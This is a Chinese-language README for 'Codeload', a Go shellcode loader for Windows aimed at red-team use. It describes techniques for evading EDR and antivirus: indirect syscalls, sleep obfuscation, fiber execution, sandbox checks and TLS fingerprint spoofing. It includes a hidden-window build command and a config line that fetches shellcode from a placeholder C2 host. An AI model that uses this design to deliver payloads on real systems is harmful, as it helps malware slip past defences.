# Codeload

**Codeload** 是一款专为红队行动和安全研究设计的高级隐蔽型 Windows Shellcode 加载器与注入器。它集成了一系列复杂的规避技术，旨在绕过现代 EDR（端点检测与响应）系统和 AV（防病毒）解决方案。

> **⚠️ 免责声明**: 本工具仅供教育目的和授权的安全测试使用。作者不对因滥用本工具造成的任何损害负责。

## ✨ 核心特性

*   **间接系统调用 (Indirect Syscalls)**: 通过 `ntdll.dll` 中发现的 `syscall; ret` gadget 直接执行系统调用，从而绕过用户模式下的 API Hooking。
*   **动态 SSN 解析 (Halo's Gate 变体)**: 通过启动一个牺牲进程 (`svchost.exe`) 并从其内存中读取干净的 `ntdll.dll` 副本，动态解析系统服务号 (SSN)，避免了读取本地可能已被 Hook 的函数。
*   **智能休眠混淆 (Smart Sleep Obfuscation)**: 实现了一种自定义休眠机制，在休眠期间加密 Shellcode/堆栈并将内存权限更改为 `RW`（读写），唤醒时恢复为 `RX`（读执行）。这有效规避了针对可执行私有内存的扫描（如“Sleeping Beacon”检测）。
*   **纤程执行 (Fiber Execution)**: 在 Windows Fiber（纤程）而非标准线程中执行 Payload，隐藏调用栈并混淆基于线程的分析。
*   **反沙箱与反分析**: 执行多项环境检查（运行时间、CPU 核心数、屏幕分辨率、域加入状态），以检测是否运行在沙箱或分析师的虚拟机中。
*   **网络规避 (uTLS)**: 使用 `uTLS` 伪造 TLS Client Hello 指纹（模拟 Chrome 浏览器），防止基于 JA3/JA4 签名的检测。
*   **远程 Payload 加载**: 从远程 C2 服务器获取 Payload 配置和 Payload 本身，Shellcode 绝不落地（不存储在磁盘上）。

## 🚀 快速开始

### 前置要求

*   **Go**: 1.20 或更高版本。
*   **目标平台**: Windows x64。

### 编译

由于本工具使用了底层 Windows 系统调用和汇编，必须针对 `windows/amd64` 进行编译。

```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o codeload.exe
```

*   `-H=windowsgui`: 隐藏控制台窗口。
*   `-s -w`: 去除调试信息以减小文件体积。

### 配置

在编译之前，请编辑 `main.go` 以设置您的远程配置 URL：

```go
// main.go
var (
    configURL = "http://your-c2-server.com/config.txt"
)
```

`config.txt` 文件内容应为您加密 Shellcode 的直接下载链接。

## 📚 文档

*   [**架构与原理**](DOCS.md): 详细解释规避技术和代码结构。
*   [**使用手册**](USAGE.md): 生成 Payload、加密 Payload 以及部署加载器的分步指南。

## 🛠 技术栈

*   **语言**: Go (Golang)
*   **汇编**: 用于系统调用转换的 x64 汇编 (`syscalls_windows_amd64.s`)
*   **库**:
    *   `golang.org/x/sys`: 系统调用。
    *   `github.com/refraction-networking/utls`: TLS 指纹伪造。
    *   `github.com/Binject/debug`: PE 解析（用于 `netcache`）。
